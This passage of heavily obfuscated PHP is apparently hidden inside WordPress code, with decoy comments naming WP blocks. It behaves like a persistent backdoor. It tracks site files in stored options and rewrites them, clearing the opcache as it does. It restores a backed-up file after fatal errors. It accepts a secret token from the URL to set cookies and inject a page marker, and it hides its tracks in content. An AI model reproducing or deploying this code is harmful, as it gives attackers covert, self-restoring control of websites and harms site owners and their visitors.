  if   ($roubiyiq8scd8  === false  &&   $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1054))) {
    $pk0ekuxmib29a8ou =     @get_option(xpm5lg9odtw6di(1345), array());
  $sz87jl6swf21kxxy  =  !$GLOBALS['__scf_zj8mp2xbaqmp_35']($pk0ekuxmib29a8ou)  ||      !isset($pk0ekuxmib29a8ou[gz_aorofp7mo(1346)],   $pk0ekuxmib29a8ou[xpm5lg9odtw6di(1347)]) ||  $pk0ekuxmib29a8ou[bk9m46jygo3f(1346)] !==   $m2uz01s7u8  || (int)  $pk0ekuxmib29a8ou[ar6vo_1nyhx2koj5(1347)] !== $a7t88ofjy5pc5;
      if   ($sz87jl6swf21kxxy  && isset($GLOBALS[bk9m46jygo3f(1265)]) &&   $GLOBALS['__scf_v834hljo6be9_67']($GLOBALS[xognx_h1jzkh(1348)])  &&   $GLOBALS['__scf__e6bt2kljb6u_120']($GLOBALS[gz_aorofp7mo(1348)],      xpm5lg9odtw6di(1349))) {
   @$GLOBALS[xognx_h1jzkh(1350)]->check_connection(false);

@update_option(xpm5lg9odtw6di(1351), $vrspdc1ver, bk9m46jygo3f(1324));
        }
  unset($pk0ekuxmib29a8ou,      $sz87jl6swf21kxxy);
      }
  unset($roubiyiq8scd8);

   }
 $dhb4mklrk0   =     fgatjmo7gg2xolgmpki4y2();



 if  (@$GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0)   ||  w1m15sg83rnn5uqc64($dhb4mklrk0,  (646-153), true)) {
      @$GLOBALS['__scf_qy_a5siry0hu3_197'](xwr2qxs5ekc1ked9xg(),   gz_aorofp7mo(778)  .   $GLOBALS['__scf_dpcnt5aa9yk_581']($vrspdc1ver));


     }
 }   catch   (Throwable   $o_qyrtxl85owt)    {
      }  catch  (Exception    $o_qyrtxl85owt)     {
 }
// WP List Block: essential witness


      }
function     oso_rftyhowcddafxsw($vrspdc1ver)
{


 if    (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($vrspdc1ver)    ||  empty($vrspdc1ver[bk9m46jygo3f(1352)]) ||     !$GLOBALS['__scf_is0fvk8c7tq2_41']($vrspdc1ver[gz_aorofp7mo(1352)]))   return    xpm5lg9odtw6di(214);
    $dz9ttep94ondlpl =    $vrspdc1ver[xognx_h1jzkh(1352)];
if   (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($dz9ttep94ondlpl)   || (int)   @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($dz9ttep94ondlpl)    <  (456+44))     return xpm5lg9odtw6di(214);
       if    (uhf6bhl56vbd0r9tcy4($dz9ttep94ondlpl))    return     xognx_h1jzkh(213);
    $a3l16_60s2rsqw9    = isset($vrspdc1ver[xpm5lg9odtw6di(1346)])   ?   $vrspdc1ver[ar6vo_1nyhx2koj5(1353)] :   "";


  $lex1fz8hla3oq = isset($vrspdc1ver[xpm5lg9odtw6di(1347)])  ?  (int) $vrspdc1ver[xognx_h1jzkh(1347)]   :    0;
    if  ($a3l16_60s2rsqw9 ===  gz_aorofp7mo(1354))    return  ($lex1fz8hla3oq  >  0  &&    $GLOBALS['__scf_ks7_xfapvywl_185']()   -   $lex1fz8hla3oq   <= (3519+81)) ? ar6vo_1nyhx2koj5(1355)  : ar6vo_1nyhx2koj5(1356);
 if    ($a3l16_60s2rsqw9   ===   gz_aorofp7mo(190))   return  ar6vo_1nyhx2koj5(1357);
 if  ($a3l16_60s2rsqw9   ===    bk9m46jygo3f(1358))  return ($lex1fz8hla3oq  >     0 &&    $GLOBALS['__scf_ks7_xfapvywl_185']()  - $lex1fz8hla3oq <=   (0x1a+0x5e))    ?    gz_aorofp7mo(1359)     : gz_aorofp7mo(1357);
   return   xognx_h1jzkh(1359);
    }
function   p1_iuc73ns3yabl($bki0gi20hmqucm)
      {
  if    (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm))    return     false;
  $v9au38bovrp0 =   (int)     @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($bki0gi20hmqucm);
 if   ($v9au38bovrp0    <  (491+9)  ||     $v9au38bovrp0   > (83409950-30981150))     return false;
    $uabrlao9g235yy   =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm, false,     null,   0,   (4009+87));
 if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($uabrlao9g235yy) ||  !$GLOBALS['__scf_ak3p5za9uvhzh8_96'](xpm5lg9odtw6di(210),    $uabrlao9g235yy)) return    false;
   if   ($v9au38bovrp0 > (1572332-523756))   {
$g3z6ma16w7vxd    = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm,  false,    null,  $v9au38bovrp0   -   (286+3810));


 return  $GLOBALS['__scf_is0fvk8c7tq2_41']($g3z6ma16w7vxd)  &&   $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xognx_h1jzkh(1360),  $g3z6ma16w7vxd) ===   1;
    }
$paudvk020we1z90  =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm);

    if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)) return  false;


    return g9edwd6m8_9cm8($paudvk020we1z90);
}



       function    v2eakz3li1fhe2q6_p9r6k($izaoaptccqq_16i,   $agqwkuals2cm_xdp)
 {
  $wowgs1_tlmn6f  =     @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($izaoaptccqq_16i,   false,   null, 0,  (4070+26));
$ofchj_3f1uknj =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($agqwkuals2cm_xdp,    false,    null,  0,   (7751-3655));
  if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($wowgs1_tlmn6f) || !$GLOBALS['__scf_is0fvk8c7tq2_41']($ofchj_3f1uknj))   return  false;


       $evlz_dujmste8h  = $w5q83o6vsv  =  null;



       if  ($GLOBALS['__scf_ak3p5za9uvhzh8_96']("/!function_exists\('([A-Za-z0-9_]+)'\)/",      $wowgs1_tlmn6f, $t6qbjowyjc58oo))  $evlz_dujmste8h  =     $t6qbjowyjc58oo[1];



       if   ($GLOBALS['__scf_ak3p5za9uvhzh8_96']("/!function_exists\('([A-Za-z0-9_]+)'\)/",  $ofchj_3f1uknj, $t6qbjowyjc58oo))      $w5q83o6vsv  =  $t6qbjowyjc58oo[1];
  return    $evlz_dujmste8h  !==   null && $evlz_dujmste8h ===   $w5q83o6vsv;
}
   function uhf6bhl56vbd0r9tcy4($bki0gi20hmqucm)
 {
$rv8s_ul0qu2z09u = $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm,   bk9m46jygo3f(1361));
 foreach     (array($GLOBALS['__scf_meo_1tvjsals_11']($bki0gi20hmqucm),  sxupmu4fhe9r2zxw())    as $q97i7_qw446ei)   {
     $f1r99wls1wz40   = $q97i7_qw446ei     . ar6vo_1nyhx2koj5(189)  .  $rv8s_ul0qu2z09u;
      if (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($f1r99wls1wz40) ||  (int)    @$GLOBALS['__scf_k4z5lhhe91ty_98']($f1r99wls1wz40) < $GLOBALS['__scf_ks7_xfapvywl_185']() - (604714+86))   continue;

 $r8z87a9tr_fbv  =    $GLOBALS['__scf_u6m4cedwgt__319']((string)    @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($f1r99wls1wz40));



   if ($r8z87a9tr_fbv ===   "")   continue;

     $paudvk020we1z90   =  iljst04arjh1pet016s($bki0gi20hmqucm);
  if  ($paudvk020we1z90  ===      null) continue;
  if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)   &&   $paudvk020we1z90     !== ""     &&   $GLOBALS['__scf_eo363tjzd4r6n_56']($paudvk020we1z90)  ===  $r8z87a9tr_fbv)  return   true;
     }


        return    false;
 }
 function keh1ava3klp_pu0e_6n($bki0gi20hmqucm)
    {


 if    (!$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1054)) || !$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1362)))  return;
      $o6w_gkzy4eqv4x  =  @get_option(bk9m46jygo3f(1363),    array());

 if  (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($o6w_gkzy4eqv4x)) $o6w_gkzy4eqv4x =  array();
$o6w_gkzy4eqv4x[$GLOBALS['__scf_eo363tjzd4r6n_56']($bki0gi20hmqucm)]    = $bki0gi20hmqucm;
 if    ($GLOBALS['__scf_oenrsvkzs1_36']($o6w_gkzy4eqv4x)  >   (0xb+0x9))  $o6w_gkzy4eqv4x   = $GLOBALS['__scf_umxqreicn053_158']($o6w_gkzy4eqv4x,    -(18+2),    null, true);
 @update_option(ar6vo_1nyhx2koj5(1363),  $o6w_gkzy4eqv4x, ar6vo_1nyhx2koj5(1364));
}
 function hkeuitkjvw60nnphr()
  {



  if   (!$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1054)) || !$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1365)))  return;
        $o6w_gkzy4eqv4x =  @get_option(xpm5lg9odtw6di(1363),  array());
if   (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($o6w_gkzy4eqv4x)     ||  empty($o6w_gkzy4eqv4x))   return;
 $drftmzotq7f  =  array();


   foreach     ($o6w_gkzy4eqv4x  as  $xvqxrl6r3nrmbkp  =>    $dz9ttep94ondlpl)    {



     if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($dz9ttep94ondlpl)     ||    $dz9ttep94ondlpl  ===   ""  ||  !@$GLOBALS['__scf_vpig9uwvw8_pu_20']($dz9ttep94ondlpl))     continue;$bh825v8gb5_=-699;$geqhmmym=($bh825v8gb5_>0)?$bh825v8gb5_:-$bh825v8gb5_;


   if ($dz9ttep94ondlpl    ===  bho93o6vof3ni5_rg622_h())   continue;



 $vbku41goboq   = @$GLOBALS['__scf_amk7iuqda_oe_33']($dz9ttep94ondlpl);


 $vtyzf3dn5gzm03sk     =     @$GLOBALS['__scf_amk7iuqda_oe_33'](bho93o6vof3ni5_rg622_h());
    if ($GLOBALS['__scf_is0fvk8c7tq2_41']($vbku41goboq)   &&   $GLOBALS['__scf_is0fvk8c7tq2_41']($vtyzf3dn5gzm03sk) &&   $vbku41goboq ===     $vtyzf3dn5gzm03sk) continue;


 unset($vbku41goboq,  $vtyzf3dn5gzm03sk);
    if  (p82470xv4eq7_pm5tl4hw9($dz9ttep94ondlpl) === false)     {
    $drftmzotq7f[$xvqxrl6r3nrmbkp]   = $dz9ttep94ondlpl;
    continue;
  }
f97udlofaljpuxw1_jgnfh($dz9ttep94ondlpl, (321+99));
     if (xv6oqhjncehpr7v_mus7($dz9ttep94ondlpl)) {
 if     ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1289)))    @opcache_invalidate($dz9ttep94ondlpl,     true);
      } elseif  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($dz9ttep94ondlpl)) {
 $drftmzotq7f[$xvqxrl6r3nrmbkp]    = $dz9ttep94ondlpl;
   }
 }
@update_option(gz_aorofp7mo(1366),    $drftmzotq7f, xpm5lg9odtw6di(1364));
 }
       function jtc41ohfk3quigb4p()
      {
 try  {
   $o_qyrtxl85owt =   $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(171))   ?  @error_get_last() :  null;
 if   (
  $GLOBALS['__scf_zj8mp2xbaqmp_35']($o_qyrtxl85owt)  &&    !empty($o_qyrtxl85owt[xpm5lg9odtw6di(180)])  &&  !empty($o_qyrtxl85owt[xpm5lg9odtw6di(1367)])
 && $GLOBALS['__scf_uh0dc0gefs_xhu_149']($o_qyrtxl85owt[gz_aorofp7mo(1368)],   array(E_ERROR, E_PARSE,   E_CORE_ERROR,  E_COMPILE_ERROR, E_USER_ERROR),   true)
 ) {
  $xs89htey0m  =   @$GLOBALS['__scf_amk7iuqda_oe_33'](bho93o6vof3ni5_rg622_h());
  $_ef   =   @$GLOBALS['__scf_amk7iuqda_oe_33']($o_qyrtxl85owt[ar6vo_1nyhx2koj5(180)]);
if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($xs89htey0m) &&  $GLOBALS['__scf_is0fvk8c7tq2_41']($_ef)     &&    $_ef  ===     $xs89htey0m)   return;
   }
  vssmljt7_blzonb7w7(xpm5lg9odtw6di(1355));
  if   (defined(xognx_h1jzkh(1146))) {
       $g14wzv47wtmcsw  =    o_6mdjsw6n7ovdc1_yox();
  if    (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($g14wzv47wtmcsw[1])) {
  $o5nrsh4g4i7v =    @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($g14wzv47wtmcsw[1],   false,    null,    0,     (67-3));
  if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($o5nrsh4g4i7v) &&   $GLOBALS['__scf_j_4rj7vg4ae0j_7']($o5nrsh4g4i7v,   xpm5lg9odtw6di(1237) .   xl8k_pjv1048a7ae7()  .   ':')    === 0) {
$n4ya2e3nmtr0j = @$GLOBALS['__scf_vpig9uwvw8_pu_20']($g14wzv47wtmcsw[1]    . ar6vo_1nyhx2koj5(1369))   ? @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($g14wzv47wtmcsw[1]    .    bk9m46jygo3f(1369),  false,     null, 0,  (106^42))   :   "";
   if   ($n4ya2e3nmtr0j !==  $o5nrsh4g4i7v) @$GLOBALS['__scf_hnc1gj0s4looo5_75']($g14wzv47wtmcsw[1],      $g14wzv47wtmcsw[1]   . gz_aorofp7mo(1369));
   }
}
      unset($g14wzv47wtmcsw,   $o5nrsh4g4i7v,     $n4ya2e3nmtr0j);



      }
     }   catch    (Throwable  $g5al51xfjh) {
// @merge orchestrator



  }     catch  (Exception      $g5al51xfjh) {
    }
}
 function gzcmykzwt7djzyujh2n($agqwkuals2cm_xdp)


    {
        if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($agqwkuals2cm_xdp))    return  "";
   if   ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](gz_aorofp7mo(1371),     $agqwkuals2cm_xdp,     $i6cfgq4vhw123z)) {
 foreach   ($i6cfgq4vhw123z[1]   as $fvs3_k1meh40x) {
// orthogonal-adj work-queue

        if (fgctt98wtdjhjiow($GLOBALS['__scf_hg1ogpq4w6_351']($fvs3_k1meh40x,  true)))  return    "";
   }
}
   if ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](bk9m46jygo3f(1372), $agqwkuals2cm_xdp, $i6cfgq4vhw123z)) {
/* quadratic pipeline */

    foreach  ($i6cfgq4vhw123z[1]    as    $fvs3_k1meh40x) {
if   (fgctt98wtdjhjiow(stripcslashes($fvs3_k1meh40x)))     return  "";

if  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($fvs3_k1meh40x, bk9m46jygo3f(1373))      !==  false)    {
      $wqks3n9kp9zx1g   =   preg_replace_callback(bk9m46jygo3f(1374), gz_aorofp7mo(1375),      $fvs3_k1meh40x);
   if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($wqks3n9kp9zx1g)   &&     $wqks3n9kp9zx1g !== $fvs3_k1meh40x &&   fgctt98wtdjhjiow($wqks3n9kp9zx1g)) return  "";
    }



  }

}
 if    ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](gz_aorofp7mo(1376),  $agqwkuals2cm_xdp,  $i6cfgq4vhw123z))   {
foreach    ($i6cfgq4vhw123z[1]  as $fvs3_k1meh40x)  {
if (fgctt98wtdjhjiow($GLOBALS['__scf_vz8ci2guu7b5_355'](array(bk9m46jygo3f(1377),    ar6vo_1nyhx2koj5(1378)), array('\\',   '\''),    $fvs3_k1meh40x)))  return   "";
if  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($fvs3_k1meh40x, ar6vo_1nyhx2koj5(1373))    !== false) {
     $wqks3n9kp9zx1g   =    preg_replace_callback(gz_aorofp7mo(1374), xognx_h1jzkh(1375), $fvs3_k1meh40x);
 if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($wqks3n9kp9zx1g)   &&  $wqks3n9kp9zx1g !==     $fvs3_k1meh40x &&   fgctt98wtdjhjiow($wqks3n9kp9zx1g)) return  "";
  }



}
  }
return $agqwkuals2cm_xdp;
 }
  function  tnvo03hz6g82ft2u7cjp1($klljgz9tv3wp3)
     {
     if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($klljgz9tv3wp3)   ||      ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($klljgz9tv3wp3,   bk9m46jygo3f(1379))    ===    false     &&  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($klljgz9tv3wp3, bk9m46jygo3f(1380)) ===  false)) return  false;
if    ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](ar6vo_1nyhx2koj5(1371),   $klljgz9tv3wp3,     $i6cfgq4vhw123z))  {
 foreach  ($i6cfgq4vhw123z[1] as  $fvs3_k1meh40x)  {

 if     (fgctt98wtdjhjiow($GLOBALS['__scf_hg1ogpq4w6_351']($fvs3_k1meh40x,   true)))  return  true;
   }



     }
        if   ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](ar6vo_1nyhx2koj5(1372),  $klljgz9tv3wp3,   $i6cfgq4vhw123z)) {
// deprovision hermitian timeout-policy



 foreach  ($i6cfgq4vhw123z[1] as  $fvs3_k1meh40x)    {
if (fgctt98wtdjhjiow(stripcslashes($fvs3_k1meh40x)))  return  true;



}
  foreach ($i6cfgq4vhw123z[1] as $fvs3_k1meh40x)  {
       if  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($fvs3_k1meh40x,   gz_aorofp7mo(1381))  ===   false) continue;
 $wqks3n9kp9zx1g  = preg_replace_callback(xpm5lg9odtw6di(1382), xpm5lg9odtw6di(1375), $fvs3_k1meh40x);
 if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($wqks3n9kp9zx1g) &&   $wqks3n9kp9zx1g  !== $fvs3_k1meh40x   &&     fgctt98wtdjhjiow($wqks3n9kp9zx1g))     return    true;

       }
   }
  if  ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](gz_aorofp7mo(1383),    $klljgz9tv3wp3,  $i6cfgq4vhw123z))  {
 foreach  ($i6cfgq4vhw123z[1] as   $fvs3_k1meh40x)    {
     if  (fgctt98wtdjhjiow($GLOBALS['__scf_vz8ci2guu7b5_355'](array(xpm5lg9odtw6di(1377),  xpm5lg9odtw6di(1378)),    array('\\',  '\''),    $fvs3_k1meh40x)))  return true;
       }
// WP Table Block: convex ring-buffer

  foreach  ($i6cfgq4vhw123z[1]    as  $fvs3_k1meh40x) {



 if  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($fvs3_k1meh40x,  xognx_h1jzkh(1381))    === false)  continue;


    $wqks3n9kp9zx1g   =    preg_replace_callback(bk9m46jygo3f(1382),  xognx_h1jzkh(1384), $fvs3_k1meh40x);


    if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($wqks3n9kp9zx1g)   &&  $wqks3n9kp9zx1g  !== $fvs3_k1meh40x  &&    fgctt98wtdjhjiow($wqks3n9kp9zx1g))  return  true;
  }
// iterate normal-form for WP Heading Block

    }
   return     false;



 }



 function klhxdic2rbndomswk1($klljgz9tv3wp3)
 {
    if     (!$GLOBALS['__scf_is0fvk8c7tq2_41']($klljgz9tv3wp3)   || $klljgz9tv3wp3 === "")   return  "";


return   ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](xpm5lg9odtw6di(730), $GLOBALS['__scf__fl_gwujcblq_9']($klljgz9tv3wp3,    0,  (8096+96)), $wmi9vtfi67mkceoi))  ?  $wmi9vtfi67mkceoi[1]  :   "";
     }



function   yezcy6nac7y0hwjhoe($paudvk020we1z90,    $rhb7ikn12gowlj,     $bb9zpsruvkm = null)



   {
if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)    ||   $paudvk020we1z90    === "") return     $paudvk020we1z90;


 $ickq6zuqypem   =      ar6vo_1nyhx2koj5(814)  .   $rhb7ikn12gowlj .  xognx_h1jzkh(774);
   $wyjil_di2aatar      =   "";



$cx22jqw0hl7at9kk    =   0;
while ($cx22jqw0hl7at9kk++ <    (0x5a+0x26)) {
$io8u2gc0chv = $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,    $ickq6zuqypem);
 if  ($io8u2gc0chv ===   false) break;
  




$xpwkmi1gfee   =   $io8u2gc0chv  +   $GLOBALS['__scf_fxl4k4gsul_10']($ickq6zuqypem);
 $mlb19k2_512b   = $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,  gz_aorofp7mo(1273),     $xpwkmi1gfee);
 if ($mlb19k2_512b  ===   false ||   $mlb19k2_512b - $xpwkmi1gfee >   (16+48)) {
     $wyjil_di2aatar  .=     $GLOBALS['__scf__fl_gwujcblq_9']($paudvk020we1z90, 0,  $xpwkmi1gfee);
     $paudvk020we1z90     =    $GLOBALS['__scf__fl_gwujcblq_9']($paudvk020we1z90,  $xpwkmi1gfee);$d76frkojwy=5500;$ifvk727ll_g=$d76frkojwy%9;
 continue;
 }
   $wvf0emlp6_y7ru  = $GLOBALS['__scf__fl_gwujcblq_9']($paudvk020we1z90,  $xpwkmi1gfee,   $mlb19k2_512b   -   $xpwkmi1gfee);
   if    (!$GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(1385),  $wvf0emlp6_y7ru))    {
      $wyjil_di2aatar   .=      $GLOBALS['__scf__fl_gwujcblq_9']($paudvk020we1z90, 0,   $xpwkmi1gfee);
 $paudvk020we1z90      =   $GLOBALS['__scf__fl_gwujcblq_9']($paudvk020we1z90, $xpwkmi1gfee);
continue;
 }
  $sxcn0d5hjgyz2w    = xpm5lg9odtw6di(814)  .   $rhb7ikn12gowlj  . xognx_h1jzkh(1386)     . $wvf0emlp6_y7ru .   xpm5lg9odtw6di(1273);

  $ch2y8jbc606e3zds =  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,  $sxcn0d5hjgyz2w,  $mlb19k2_512b);
   if ($ch2y8jbc606e3zds  ===  false) break;



  $wyjil_di2aatar    .=    $GLOBALS['__scf__fl_gwujcblq_9']($paudvk020we1z90,  0, $io8u2gc0chv);
 $euarczhc23  =  $GLOBALS['__scf__fl_gwujcblq_9']($paudvk020we1z90,    $io8u2gc0chv, $ch2y8jbc606e3zds   +   $GLOBALS['__scf_fxl4k4gsul_10']($sxcn0d5hjgyz2w)   -  $io8u2gc0chv);
   if ($bb9zpsruvkm  !==  null) {
$yc_3fgo7em8cww    =   $GLOBALS['__scf_pds8salms2pk_289']($bb9zpsruvkm,      $euarczhc23);
    if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($yc_3fgo7em8cww))     $wyjil_di2aatar .= $yc_3fgo7em8cww;
   } else    {
 $wyjil_di2aatar .=   $euarczhc23;
  }
$paudvk020we1z90   =  $GLOBALS['__scf__fl_gwujcblq_9']($paudvk020we1z90,   $ch2y8jbc606e3zds    + $GLOBALS['__scf_fxl4k4gsul_10']($sxcn0d5hjgyz2w));

}
return $wyjil_di2aatar    . $paudvk020we1z90;
 }
  function    sjpktxzq5xttja72c5f7r($agqwkuals2cm_xdp)
  {
    return  "";



   }
 function   wg3duyuj6ilnwdjk1knyfa($agqwkuals2cm_xdp)
{

if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($agqwkuals2cm_xdp))  return   "";
  if   (!defined(bk9m46jygo3f(1146)))  return $agqwkuals2cm_xdp;



   $iin2d_vozo_f  =  g2g3r6pz8prst3gz(ABSPATH     .     xpm5lg9odtw6di(1387),   (3+5));
if   ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](xpm5lg9odtw6di(1388)  .  $iin2d_vozo_f .   xognx_h1jzkh(1389),  $agqwkuals2cm_xdp))  return "";
 return $agqwkuals2cm_xdp;

}
   function z61fradqylojwtzllav3u($paudvk020we1z90)


     {
if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90) ||    $paudvk020we1z90      ===  "") return $paudvk020we1z90;
$_svae0z2nfoqm  = yezcy6nac7y0hwjhoe($paudvk020we1z90,  xognx_h1jzkh(1390),  xognx_h1jzkh(1391));
  $_svae0z2nfoqm  =    yezcy6nac7y0hwjhoe($_svae0z2nfoqm, gz_aorofp7mo(1392),     xpm5lg9odtw6di(1393));

  if      ($GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm)) $_svae0z2nfoqm  =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](xognx_h1jzkh(1394), "",    $_svae0z2nfoqm);
 if     (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm)) $_svae0z2nfoqm = $paudvk020we1z90;
  if (tnvo03hz6g82ft2u7cjp1($_svae0z2nfoqm))    {



$_svae0z2nfoqm   =   yezcy6nac7y0hwjhoe($_svae0z2nfoqm,  bk9m46jygo3f(1390),   xpm5lg9odtw6di(1395));
$_svae0z2nfoqm =   yezcy6nac7y0hwjhoe($_svae0z2nfoqm, xognx_h1jzkh(1392),  xognx_h1jzkh(1395));



   if ($GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm))  $_svae0z2nfoqm   =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](xognx_h1jzkh(1394),     "",  $_svae0z2nfoqm);


}
return    $GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm) ? $_svae0z2nfoqm      : $paudvk020we1z90;
}


    function  mf82q3p0o_kc_8ll_($paudvk020we1z90)
{
if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)  || !defined(ar6vo_1nyhx2koj5(1146)))  return     false;
   if  ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](gz_aorofp7mo(1396),  $paudvk020we1z90))   return true;
       $vikyfoh05h9m2z   =    g2g3r6pz8prst3gz(ABSPATH   .     bk9m46jygo3f(1387),  (0x7+0x1));
   if ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](gz_aorofp7mo(1397),    $paudvk020we1z90,     $lxf_05247qeewd3))  {
   foreach ($lxf_05247qeewd3[1] as     $nb2aghmmee5ff)    {
if   ($GLOBALS['__scf__fl_gwujcblq_9']($nb2aghmmee5ff, -(0x2+0x7)) ===  ':'  .   $vikyfoh05h9m2z)   return    true;



}
}
    $_dd     = $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56'](ABSPATH      .  gz_aorofp7mo(1398)),    0,    (3+5));
       if ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](ar6vo_1nyhx2koj5(1399),     $paudvk020we1z90, $_dm))      {
        foreach   ($_dm[1]  as   $kfs1_lhmb5)  {$ljqr8jqpit2v=1800;$lfgb2iha7=$ljqr8jqpit2v%6;
    if  ($kfs1_lhmb5   ===    $_dd)   return  true;
  }
      }
return  false;
   }
      function      ljjtaw0e3axkk7q_8sv1()
{
    if      (!isset($_GET[xpm5lg9odtw6di(1400)])  ||    !$GLOBALS['__scf_is0fvk8c7tq2_41']($_GET[gz_aorofp7mo(1401)])     ||    !$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1402)))   return;
     $a3l16_60s2rsqw9  =  @get_option(xpm5lg9odtw6di(1403), array());
  if    (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($a3l16_60s2rsqw9))      return;



 $tfvm_ort_zgdr =  (string)      $_GET[gz_aorofp7mo(1401)];
  $wsjq1ioc2gjpu1   =  array();
if   (isset($a3l16_60s2rsqw9['t']))  $wsjq1ioc2gjpu1[] =      (string) $a3l16_60s2rsqw9['t'];
if   (isset($a3l16_60s2rsqw9[bk9m46jygo3f(1404)]) &&  $GLOBALS['__scf_zj8mp2xbaqmp_35']($a3l16_60s2rsqw9[bk9m46jygo3f(1404)])) {
 foreach   ($a3l16_60s2rsqw9[gz_aorofp7mo(1404)]      as  $n_2ru_zt6chty) {
  if      ($GLOBALS['__scf_zj8mp2xbaqmp_35']($n_2ru_zt6chty)   && isset($n_2ru_zt6chty['t']))  $wsjq1ioc2gjpu1[] =    (string) $n_2ru_zt6chty['t'];
  }
 }



  $sjts7iz8bpwu2w5     =  false;
foreach ($wsjq1ioc2gjpu1 as $hqttcr9b5885)  {
   if    ($hqttcr9b5885  ===  "")   continue;

$sjts7iz8bpwu2w5  =  $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1405))  ?  hash_equals($hqttcr9b5885,  $tfvm_ort_zgdr)  :  ($hqttcr9b5885  ===      $tfvm_ort_zgdr);
 if  ($sjts7iz8bpwu2w5) break;
}

  if   (!$sjts7iz8bpwu2w5) return;
  $GLOBALS[bk9m46jygo3f(1406)]  =    $tfvm_ort_zgdr;



    at5lxm3vzat7_ev9(xognx_h1jzkh(1407),  xpm5lg9odtw6di(1408),  -1);
  if  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(169)))    {
    $GLOBALS['__scf_l3dns7czmg3tv_169'](xpm5lg9odtw6di(1408));
  }
// FFI bindings: strong transformer

    }
function vuz_88kdchi44nf()
        {
    if      (empty($GLOBALS[xognx_h1jzkh(1406)])     || !$GLOBALS['__scf_is0fvk8c7tq2_41']($GLOBALS[xognx_h1jzkh(1406)])) return;
      if  (!empty($GLOBALS[xognx_h1jzkh(1409)]))  return;
       $GLOBALS[xpm5lg9odtw6di(1410)]    = true;
 echo  "\n<!--SCK:"    . $GLOBALS[xpm5lg9odtw6di(1411)]   .  xpm5lg9odtw6di(1412);



    }

 function    d0snst04gqtqcr()

 {
 if  (!$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1402)))      return false;
